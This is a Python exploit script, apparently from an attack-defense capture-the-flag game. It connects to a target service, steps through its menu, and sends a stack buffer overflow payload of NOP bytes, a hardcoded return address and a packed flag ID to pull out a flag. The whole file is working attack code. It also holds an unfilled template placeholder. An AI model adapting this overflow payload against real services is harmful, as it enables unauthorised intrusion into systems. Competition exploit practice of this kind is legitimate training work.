import sys
import struct

XXXSHAREDXXX

class Exploit():
    def __init__(self):
        self.NOP = '\x90'
        self.expl_addr = '\xe0\xb0\x04\x08'
        self.esp_ph = '\x90\x90\x90\x90'

    def do_exploit(self, s, flag_id):
        flag_id_bytes = struct.pack('<i', int(flag_id))

        # Menu
        recvMessage(s)

        # Exit
        input  = 'e'
        sendMessage(s,input)
        recvMessage(s)
        recvMessage(s)

        # Help
        input  = 'h'
        sendMessage(s,input)
        recvMessage(s)

        # BOF
        input = ''
        for i in range (0, 20):
            input += '\x90'
        input += self.expl_addr + self.esp_ph + flag_id_bytes
        sendMessage(s,input)
        recvMessage(s)

        # FLAG!
        recvMessage(s)
        flag = recvMessage(s)
        return flag

    def execute(self, ip, port, flag_id):
        data = ''
        self.error = 0
        self.error_msg = ''
        self.flag = ''

        try:
            s = getSocket(ip, port)
        except Exception as e:
            self.flag = ''
            self.error = -1
            self.error_msg = "connection refused"
            return

        try:
            data = self.do_exploit(s, flag_id)
        except Exception as e:
            self.flag = ''
            self.error = 1
            self.error_msg = str(e)
            return

        self.flag = data.split(':')[2]
        self.flag = self.flag.split()[0]

    def result(self):
        return {'FLAG' : self.flag,
                'ERROR' : self.error,
                'ERROR_MSG' : self.error_msg,
                }
